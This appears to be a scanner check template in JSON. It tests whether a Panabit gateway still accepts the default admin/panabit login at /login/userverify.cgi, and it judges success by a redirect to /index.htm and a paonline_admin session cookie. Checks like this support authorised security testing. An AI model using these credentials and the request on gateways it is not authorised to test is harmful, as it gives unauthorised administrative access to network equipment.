{
    "Name": "panabit-gateway-default-password",
    "Description": "panabit-gateway-default-password",
    "Product": "panabit",
    "author": "chumeng",
    "Request":[
                {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/login/userverify.cgi",
        "Port":"",
        "Data":"username=admin&password=panabit",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
                "Operation": "contains",
                "Key":"",
                "Value": "URL=/index.htm"
            },
            {
                "Operation": "contains",
                "Key":"Set-Cookie",
                "Value": "paonline_admin"
            },
            {
                "Operation": "code",
                "Key":"",
                "Value": "200"
            }
        ]
        },
        "Next_decide":""
                }
]}
